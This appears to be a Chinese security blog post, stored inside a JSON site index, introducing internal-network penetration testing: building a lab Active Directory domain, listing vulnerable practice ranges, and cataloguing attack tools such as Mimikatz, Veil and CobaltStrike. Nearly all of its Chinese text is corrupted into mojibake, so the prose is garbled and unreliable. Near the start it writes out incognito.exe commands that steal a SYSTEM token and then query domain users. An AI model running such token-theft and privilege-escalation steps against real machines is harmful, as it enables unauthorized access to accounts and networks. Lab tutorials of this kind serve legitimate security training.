ä½†éœ€è¦æ˜ç¡®çš„æ˜¯ï¼Œé¢˜ç›®ä¸¤ä¸ªä»ç„¶æ˜¯ä¸åŒçš„æ¦‚å¿µï¼ŒSYSTEM è´¦æˆ·ä¸æ˜¯ä¸“é—¨ä¸ºåŸŸä¸­çš„æœºå™¨è´¦æˆ·è€Œåˆ›å»ºçš„ è¿™é‡Œæˆ‘ä»¬é€šè¿‡ incognitoçªƒå–ä»¤ç‰Œåˆ‡æ¢ä¸º systemèº«ä»½æ¼”ç¤ºä¸€ä¸‹ de1ayä¸º PCä¸»æœºæœ¬åœ°ç”¨æˆ·ï¼Œæ— æ³•å¯¹åŸŸå†…è¿›è¡ŒæŸ¥è¯¢ 12# ç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdincognito.exe list_tokens -u # åˆ—å‡ºtoken 1incognito.exe execute -c &quot;NT AUTHORITY\\SYSTEM&quot; cmd.exe # çªƒå–å…¶ä»–ä»¤ç‰Œ ä»¥ NT AUTHORITY\\SYSTEMèº«ä»½è¿è¡Œ cmd ç„¶å net user /domainè¿›è¡ŒæŸ¥è¯¢åŸŸå†…ç”¨æˆ· æˆåŠŸ &lt;2&gt; æ”»å‡»ä¸»æœºå¹³å°ä¸å·¥å…·åˆ©ç”¨è™šæ‹Ÿæœºä¸‰ç§æ¨¡å¼ï¼š æ¡¥æ¥æ¨¡å¼ï¼šè™šæ‹Ÿæœºåœ¨å±€åŸŸç½‘ä¸­ä½œä¸ºç‹¬ç«‹çš„ä¸»æœºï¼Œå¯ä»¥å’Œå±€åŸŸç½‘é‡Œå…¶ä»–æœºå™¨ç›¸äº’è®¿é—® NATæ¨¡å¼ï¼šè™šæ‹Ÿæœºå€ŸåŠ©ç‰©ç†æœºæ¥ä¸Šç½‘ï¼Œå¯ä»¥å’Œç‰©ç†æœºä¹‹é—´ç›¸äº’è®¿é—®ï¼Œé™¤ç‰©ç†æœºä¹‹å¤–å…¶ä»–æœºå™¨æ˜¯ä¸èƒ½è®¿é—®è™šæ‹Ÿæœºçš„ã€‚ä½†æ˜¯è™šæ‹Ÿæœºå¯ä»¥è®¿é—®åŒç½‘æ®µçš„å…¶ä»–æœºå™¨çš„(å› ä¸ºä½ ç‰©ç†æœºæ˜¯å¯ä»¥è®¿é—®å…¶ä»–ç”µè„‘çš„ï¼Œè€Œå®ƒæ˜¯å€ŸåŠ©ç‰©ç†æœº)ã€‚ Host-onlyæ¨¡å¼ï¼šä»…ä¸»æœºæ¨¡å¼ã€‚åœ¨æ¸—é€æµ‹è¯•å®éªŒä¸­æ¨èç”¨host-onlyæ¨¡å¼ï¼Œæ˜¯ä¸‰ç§æ¨¡å¼ä¸­éšç§˜æ€§æœ€å¼ºã€æœ€ä¸¥æ ¼çš„ç½‘ç»œé…ç½®ã€‚è™šæ‹Ÿæœºå¤„äºä¸€ä¸ªç‹¬ç«‹çš„ç½‘æ®µï¼Œå’Œç‰©ç†æœºçš„ipæ®µæ˜¯åˆ†å¼€æ¥çš„ã€‚è¿™ä¸ªæ¨¡å¼ä¸‹è™šæ‹Ÿæœºæ˜¯ä¸èƒ½ä¸Šç½‘çš„ï¼Œä¸»æœºå’Œè™šæ‹Ÿæœºå¯ä»¥äº’è®¿ (1) åŸŸç¯å¢ƒæ­å»ºä¸‹è½½æ“ä½œç³»ç»Ÿçš„ç½‘ç«™ï¼šhttps://msdn.itellyou.cn/å®‰è£…æ•™ç¨‹ï¼šhttps://www.cnblogs.com/1vxyz/p/17131317.html 1. ç½‘ç»œæ‹“æ‰‘ æ“ä½œç³»ç»Ÿ å®‰è£…æœåŠ¡ è®¡ç®—æœºåç§° IP DNSæœåŠ¡å™¨åœ°å€ Windows server 2012 R2 AD/DC DC 192.168.1.1 192.168.1.1 Windows7 åŠ å…¥åŸŸ WIN7 192.168.1.2 192.168.1.1 Windows server 2008 R2 åŠ å…¥åŸŸ WEB 192.168.1.3 192.168.1.1 2. åŸŸç¯å¢ƒé…ç½®æ“ä½œæµç¨‹ï¼šWindows server 2012 R2æ›´æ”¹IPåœ°å€â€“&gt;æ›´æ”¹è®¡ç®—æœºåâ€“&gt;å®‰è£…åŸŸæ§å’ŒDNSæœåŠ¡â€“&gt;å‡çº§æœåŠ¡å™¨â€“&gt;åˆ›å»ºADåŸŸâ€“&gt;åˆ›å»ºç”¨æˆ· windows server 2008 R2ï¼šæ›´æ”¹IPåœ°å€ä¸DNSæœåŠ¡å™¨åœ°å€â€“&gt;æ›´æ”¹è®¡ç®—æœºåâ€“&gt;åŠ å…¥åŸŸ windows7ï¼šæ›´æ”¹IPåœ°å€ä¸DNSæœåŠ¡å™¨åœ°å€â€“&gt;æ›´æ”¹è®¡ç®—æœºåâ€“&gt;åŠ å…¥åŸŸ Windows 2012 R2è®¾ç½®â˜…è®¾ç½®ipã€æ›´æ”¹è®¡ç®—æœºåã€å®‰è£…åŸŸæ§åˆ¶å™¨å’ŒDNSæœåŠ¡ã€å‡çº§æœåŠ¡å™¨ã€åˆ›å»ºActive Directoryç”¨æˆ· è®¾ç½®ipä¸º192.168.1.1ï¼Œå­ç½‘æ©ç ä¸º255.255.255.0ï¼ŒDNSæŒ‡å‘è‡ªå·±IP æ›´æ”¹è®¡ç®—æœºåç§°ä¸ºDC ç„¶åä¼šæ˜¾ç¤ºé‡æ–°å¯åŠ¨æ‰ä¼šå®Œæˆæ›´æ”¹ï¼Œæˆ‘ä»¬é‡å¯ã€‚ å®‰è£…åŸŸæ§åˆ¶å™¨å’ŒDNSæœåŠ¡åœ¨æœåŠ¡å™¨ç®¡ç†å™¨ä¸­ï¼Œé€‰æ‹© æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½ -&gt; é»˜è®¤ä¸‹ä¸€æ­¥è‡³æœåŠ¡å™¨è§’è‰²ï¼Œç‚¹ä¸Š Active DirectoryåŸŸæœåŠ¡ ä¸ DNSæœåŠ¡å™¨ å†é»˜è®¤ä¸‹ä¸€æ­¥ è‡³ ç¡®è®¤ï¼Œå‹¾é€‰ä¸Šå¦‚æœéœ€è¦ è‡ªåŠ¨å¯åŠ¨ç›®æ ‡æœåŠ¡å™¨ã€‚å®‰è£…å³å¯ å‡çº§ä¸ºåŸŸæ§åˆ¶å™¨ç‚¹å‡»ğŸš©æ—è¾¹çš„âš ï¼Œç‚¹å‡» å°†æ­¤æœåŠ¡å™¨å‡ä¸ºåŸŸæ§åˆ¶å™¨ å¹¶ä¸” æ·»åŠ æ–°æ—ï¼Œè®¾ç½®æ ¹åŸŸåä¸º hack.testlab è®¾ç½®DSRM(ç›®å½•è¿˜åŸæ¨¡å¼)å¯†ç è¿™ä¸ªå¯†ç æ˜¯å¹²ä»€ä¹ˆç”¨çš„å‘¢ï¼Ÿ è¿™ä¸ªå¯†ç æ˜¯æˆ‘ä»¬å¼€æœºè¿›å…¥å®‰å…¨æ¨¡å¼ï¼Œä¿®å¤æ•°æ®åº“çš„æ—¶å€™ç”¨çš„ç‚¹å‡»ä¸‹ä¸€æ­¥ä¹‹åï¼Œä¼šæœ‰ä¸€ä¸ªä»€ä¹ˆDNSâš  ä¸ç”¨ç†ä¼šå®ƒ è®¾ç½®NetBIOSè¿™ä¸ªNetBIOSåŸŸåæ˜¯ï¼Œæ¯”å¦‚ä¸æ”¯æŒDNSçš„æ—§ç³»ç»Ÿï¼Œæ¯”å¦‚win98 éœ€è¦é€šè¿‡è¿™ä¸ªåæ¥è¿›è¡Œé€šè®¯ï¼Œè¿™é‡Œä¿æŒé»˜è®¤ è®¾ç½®è·¯å¾„è·¯å¾„â€“æŒ‡å®šæ•°æ®åº“ã€æ—¥å¿—ã€SYSVOLæ–‡ä»¶å¤¹ä½ç½®ï¼š è¿™é‡Œä¿æŒé»˜è®¤ å®‰è£…ADåŸŸæœåŠ¡ é‡å¯å®Œæˆä¹‹åï¼Œæˆ‘ä»¬è¿™ä¸ªæœºå™¨çš„administratorï¼Œä¹Ÿå°±éšä¹‹å˜æˆäº†åŸŸç®¡ç†å‘˜ã€‚å¯ä»¥çœ‹åˆ°ç™»å½•ç•Œé¢çš„è´¦æˆ·åä¹Ÿå˜äº†ï¼š åœ¨é‚£ä¸ªæœåŠ¡å™¨ç®¡ç†ç•Œé¢ä¹Ÿå°±å¯ä»¥çœ‹è§ ADã€IDSã€DNSç­‰æœåŠ¡äº† åŸŸæ§å®‰è£…æˆåŠŸä»¥åï¼Œä»–ä¼šå°†è‡ªå·±åœ¨åŸŸé‡Œçš„è§’è‰²ï¼Œæ³¨å†Œåˆ°DNSçš„æœåŠ¡å™¨é‡Œé¢ï¼Œä»¥è®©åŸŸé‡Œçš„å…¶ä»–è®¡ç®—æœºï¼Œèƒ½å¤Ÿé€šè¿‡è¿™ä¸ªDNSæœåŠ¡å™¨æ¥æ‰¾åˆ°è¿™å°è®¡ç®—æœºã€‚ å¯ä»¥çœ‹åˆ°dcä¸»æœºçš„è®°å½•ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„åŸŸæ§ hack.testlabå·²ç»æ­£ç¡®çš„å°†ä¸»æœºå’Œipåœ°å€æ³¨å†Œåˆ°DNSæœåŠ¡å™¨ï¼ŒåŸŸé‡Œçš„å…¶ä»–æœºå™¨å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ‰¾åˆ°åŸŸæ§ã€‚ çœ‹åˆ°è¿™ä¸ªldapè¡¨ç¤ºæˆ‘ä»¬çš„åŸŸæ§å·²ç»æ­£ç¡®çš„æ³¨å†Œä¸ºåŸŸæ§åˆ¶å™¨äº†ã€‚ä¹Ÿçœ‹åˆ°äº†è¿™ä¸ªgc å…¨å±€è¾¹è·¯ åˆ›å»ºActive Directoryç”¨æˆ·ä¸ºwindows server 2008 r2 å’Œ windows 7ç”¨æˆ·åˆ›å»ºæ§åˆ¶å™¨è´¦æˆ·ä¹Ÿå¯ä»¥åœ¨ æ§åˆ¶é¢æ¿ -&gt; ç³»ç»Ÿä¸å®‰å…¨ -&gt; ç®¡ç†å·¥å…·é‡Œæ‰“å¼€é€‰æ‹©Usersç›®å½•ï¼Œå³é”®ï¼Œæ–°å»ºå¯¹è±¡â€“ç”¨æˆ·ï¼Œåˆ›å»ºä¸€ä¸ªtestuserè´¦æˆ·å¯ä»¥çœ‹åˆ°æ·»åŠ äº†ä¸€ä¸ªæ™®é€šçš„åŸŸç”¨æˆ· testuser Windows7è®¾ç½® è®¾ç½®ipä¸DNSæœåŠ¡å™¨åœ°å€æ§åˆ¶é¢æ¿ -&gt; ç½‘ç»œå’ŒInternet -&gt; æ›´æ”¹é€‚é…å™¨è®¾ç½® -&gt; Internetåè®®ç‰ˆæœ¬(TCP/IPv4)å±æ€§è®¾ç½®å®Œä¹‹åå¯ä»¥ pingä»¥ä¸‹æˆ‘ä»¬çš„åŸŸæ§ï¼ŒDNSçš„ipåœ°å€ çœ‹çœ‹èƒ½ä¸èƒ½pingé€š åŠ å…¥åŸŸè¿™é‡Œéœ€è¦è¾“å…¥ä»¥ä¸‹åŸŸçš„è´¦å·å’Œå¯†ç ã€‚è¿™é‡Œæˆ‘ä»¬è¾“å…¥æ–°å»ºçš„testuserï¼Œç¡®å®š ç°åœ¨å‘¢ windows7ç®—æ˜¯åŠ å…¥åŸŸæˆåŠŸå•¦ï¼ ç„¶åæç¤ºå¿…é¡»é‡æ–°å¯åŠ¨è®¡ç®—æœºï¼Œç‚¹å‡»ç¡®è®¤ å¼€å§‹é‡æ–°å¯åŠ¨ã€‚ é‡å¯ä¹‹åï¼Œå¯ä»¥ç”¨åŸŸæ§ç®¡ç†å‘˜è´¦å·å¯†ç ã€ä¹Ÿå¯ä»¥ç”¨æ–°å»ºçš„é‚£ä¸ªtestueråŸŸæ™®é€šç”¨æˆ·å»ç™»å½•ã€‚å½“ç„¶è¿™ä¸¤ä¸ªç”¨æˆ·æƒé™æ˜¯ä¸ä¸€æ ·çš„ã€‚ ç°åœ¨å‘¢è¿˜æ˜¯æˆ‘ä»¬æœ¬æœºçš„ WiNDOWS7\\1vxyz è¿™é‡Œæˆ‘ä»¬åˆ‡æ¢ç”¨æˆ·ï¼Œæˆ‘ä»¬ç”¨æ™®é€šçš„åŸŸè´¦å·ç™»å½•ä¸€ä¸‹ã€‚ ç°åœ¨å¯ä»¥çœ‹åˆ°äº†ï¼ŒæˆåŠŸç™»å½•è¿›å»å•¦ã€‚ç°åœ¨å·²ç»ç®—æ‰€åŸŸç¯å¢ƒäº†ã€‚è¿™ä¸¤å°æœºå­ æ„æˆäº†ä¸€ä¸ªå°å‹ MiniåŸŸäº† pingä¸€ä¸‹æˆ‘ä»¬åŸŸæ§çš„ipåœ°å€ å’Œ DNSåŸŸå éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„ Windows 2008 R2è®¾ç½®åŒWindows7ï¼Œè®¾ç½®ipä¸º192.168.1.3 å’ŒDNSæœåŠ¡å™¨ 192.168.1.1ç„¶ååŠ å…¥åŸŸ DCç®¡ç†åŸŸå†…è®¡ç®—æœºåœ¨computersé‡Œï¼Œå³é”®win2008æœºå™¨ï¼Œç‚¹ç®¡ç† å¼¹âš äº†ï¼Œæˆ‘ä»¬å»win2008é‚£è¾¹å…³æ‰é˜²ç«å¢™å†å›æ¥ å°±å¯ä»¥è¿œç¨‹å¯¹è¿™ä¸ªç”µè„‘ï¼Œç”¨æˆ·ã€ç£ç›˜ç®¡ç†ã€ç­‰ç­‰è¿›è¡Œç®¡ç† (2) å…¶ä»–æ¼æ´å­¦ä¹ ç¯å¢ƒæ­å»º æ¼æ´é¶åœº é¶åœºæè¿° ä¸‹è½½åœ°å€ Metasploit2 Ubuntu Linuxçš„è™šæ‹Ÿæœºï¼Œå†…ç½®äº†å¸¸è§çš„æ¼æ´å…¶é»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯msfadmin https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ Metasploit3 Metasploit3çš„å‡çº§ç‰ˆï¼Œé»˜è®¤å¯†ç è¿˜æ˜¯msfadmin https://github.com/rapid7/metasploitable3 OWASPBWA ä¸€æ¬¾åŸºäºè™šæ‹Ÿæœºçš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œæä¾›ä¸€ä¸ªå­˜åœ¨å¤§é‡æ¼æ´çš„ç½‘ç«™åº”ç”¨ç¨‹åºç¯å¢ƒ https://sourceforge.net/projects/owaspbwa/files/ å†…ç½‘é¶åœº é¶åœºæè¿° ä¸‹è½½åœ°å€ çº¢æ—¥é¶åœº vultargetaé¶åœºæ˜¯æ˜ŸæœŸäº”å®éªŒå®¤å…¬ä¼—å·å‘å¸ƒçš„è‡ªè¡Œè®¾è®¡é¶åœº,å…¶ä¸­æ¶µç›–äº†WEBæ¸—é€ã€ä¸»æœºæ¼æ´ã€åŸŸæ¼æ´ã€å·¥æ§æ¼æ´ http://vulnstack.qiyuanxuetang.net/vuln/ CFSä¸‰å±‚å†…ç½‘ ä¸‰å±‚é¶æœºçš„å†…ç½‘æ¸—é€ï¼Œå¸¸ç”¨äºCTFæ¯”èµ› https://www.anquanke.com/post/id/187908 Social Network Vulnhubä¸Šçš„ä¸€å°é¶æœº http://www.yongyindai.com/plus/view.php?aid=62 (3) å†…ç½‘æ¸—é€å¸¸ç”¨å·¥å…·1. windowså¹³å°å¸¸ç”¨å·¥å…· å·¥å…·åç§° ä»‹ç»æè¿° Nmap ä¿¡æ¯æ”¶é›†ä¸ç½‘ç»œå‘ç°å·¥å…·ï¼Œç”¨äºå‘ç°ä¸»æœºï¼Œç«¯å£æ‰«æï¼Œè¯†åˆ«æœåŠ¡ï¼Œè¯†åˆ«æ“ä½œç³»ç»Ÿç­‰ Wireshark å…è´¹å¼€æºçš„ç½‘ç»œåè®®å’Œæ•°æ®åŒ…åˆ†æå™¨ï¼Œå°†ç½‘ç»œæ¥å£è®¾ç½®ä¸ºæ··æ‚æ¨¡å¼èƒ½å¤Ÿç›‘æ§æ•´ä¸ªç½‘ç»œçš„æµé‡ PUTTY å…è´¹å¼€æºçš„SSHå’ŒTelnetå®¢æˆ·ç«¯ï¼Œä¸»è¦ç”¨äºè¿œç¨‹è®¿é—® Sqlmap å…è´¹å¼€æºï¼Œä¸»è¦ç”¨æ¥å¯¹WEBåº”ç”¨ç¨‹åºè¿›è¡ŒSQLæ³¨å…¥æ”»å‡»æµ‹è¯•ï¼Œåªæ˜¯ä¸åŒæ•°æ®åº“ Burpsuite ä¸»è¦ç”¨äºå¯¹WEBåº”ç”¨ç¨‹åºè¿›è¡Œå®‰å…¨æµ‹è¯•çš„é›†æˆå¹³å° Hydra ç½‘ç»œç™»å½•çš„ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§åè®® Getif åŸºäºwindowsçš„å…è´¹å›¾å½¢ç•Œé¢å·¥å…·ï¼Œç”¨äºæ”¶é›†SNMPè®¾å¤‡çš„ä¿¡æ¯ Cain&amp;Able å¼ºæœ‰åŠ›çš„å—…æ¢å·¥å…·ä¸å¯†ç ç ´è§£ PowerSploit åŸºäºPowerShellçš„åæ¸—é€æ¡†æ¶,åŒ…å«å¾ˆå¤šPowerShellæ”»å‡»è„šæœ¬,ä¸»è¦ç”¨äºä¿¡æ¯ä¾¦æŸ¥,æƒé™æå‡,æƒé™ç»´æŒ Nishang Powershellè„šæœ¬å’Œæœ‰æ•ˆè½½è·çš„æ¡†æ¶çš„é›†åˆ 2. Linuxå¹³å°å¸¸ç”¨å·¥å…· å·¥å…·åç§° ä»‹ç»æè¿° WCE Windowså‡­æ®ç®¡ç†å™¨ï¼Œåˆ—å‡ºç™»å½•ä¼šè¯ï¼Œæ·»åŠ /ä¿®æ”¹/åˆ—å‡º/åˆ é™¤å…³è”å‡­æ®ï¼ˆLM HASH/NTML HASH/æ˜æ–‡å¯†ç /Kerberosç¥¨æ®ï¼‰ Mimikatz ç”¨äºä»å†…å­˜ä¸­è·å–æ˜æ–‡å¯†ç ï¼Œç°é‡‘ç¥¨æ®å’Œç§˜é’¥ç­‰ Responder å—…æ¢ç½‘ç»œå†…æ‰€æœ‰LLMNRåŒ…å’Œè·å–å„ä¸»æœºçš„ä¿¡æ¯ Beff ä¸€æ¬¾é’ˆå¯¹æµè§ˆå™¨çš„æ¸—é€æµ‹è¯•å·¥å…· DSHashes ä»NTDSXtractä¸­æå–ç”¨äºæ˜“äºç†è§£çš„æ•£åˆ—å€¼ Powersploit åŸºäºPowerShellçš„åæ¸—é€æ¡†æ¶,åŒ…å«å¾ˆå¤šPowerShellæ”»å‡»è„šæœ¬,ä¸»è¦ç”¨äºä¿¡æ¯ä¾¦æŸ¥,æƒé™æå‡,æƒé™ç»´æŒ Nishang é’ˆå¯¹Powershellçš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œé›†æˆäº†æ¡†æ¶ï¼Œè„šæœ¬å’Œå„ç§payload Empire å†…ç½‘æ¸—é€åˆ©å™¨ï¼Œè·¨å¹³å°ï¼Œæœ‰ä¸°å¯Œçš„æ¨¡å—å’Œæ¥å£ï¼Œç”¨äºå¯è‡ªè¡Œæ·»åŠ æ¨¡å—å’ŒåŠŸèƒ½ ps_encoder.py ä½¿ç”¨base64ç¼–ç å°è£…çš„powershellå‘½ä»¤åŒ…ï¼Œç›®çš„æ˜¯æ··æ·†å’Œå‹ç¼©ä»£ç  smbexec ä½¿ç”¨Sambaå·¥å…·çš„å¿«é€Ÿpsexecç±»å·¥å…· Veil ç”Ÿæˆç»•è¿‡å¸¸è§çš„é˜²ç—…æ¯’è§£å†³æ–¹æ¡ˆçš„Metasploitæœ‰æ•ˆè½½è· Metasploit æ¼æ´æ”»å‡»å¹³å°/5å¤§æ¡†æ¶ï¼šexploit/auxiliary/payload/post/encoder CobaltStrike ä¼˜ç§€çš„åæ¸—é€æµ‹è¯•å¹³å°ï¼Œä¸»è¦ç”¨äºå†…ç½‘æ¸—é€é€‚åˆå›¢é˜Ÿé—´ååŒå·¥ä½œ å‚è€ƒï¼šhttps://www.bilibili.com/video/BV1JA411x7HM/","link":"/2023/09/20/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"å†…ç½‘é¶åœº","slug":"å†…ç½‘é¶åœº","link":"/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/"},{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","link":"/tags/java%E5%AE%89%E5%85%A8/"},{"name":"ç”µå­å–è¯","slug":"ç”µå­å–è¯","link":"/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"},{"name":"CTFæ¯”èµ›wp","slug":"CTFæ¯”èµ›wp","link":"/tags/CTF%E6%AF%94%E8%B5%9Bwp/"},{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","link":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"ææƒ","slug":"ææƒ","link":"/tags/%E6%8F%90%E6%9D%83/"},{"name":"å·¥å…·","slug":"å·¥å…·","link":"/tags/%E5%B7%A5%E5%85%B7/"},{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","link":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"å…æ€","slug":"å…æ€","link":"/tags/%E5%85%8D%E6%9D%80/"},{"name":"ç¯å¢ƒé…ç½®","slug":"ç¯å¢ƒé…ç½®","link":"/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"categories":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","link":"/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"pages":[{"title":"about","text":"21çº§ä¿¡æ¯å®‰å…¨å°èœé¸¡ Webæ–¹å‘ æƒ³é’»ç ”å†…ç½‘æ¸—é€","link":"/about/index.html"}]}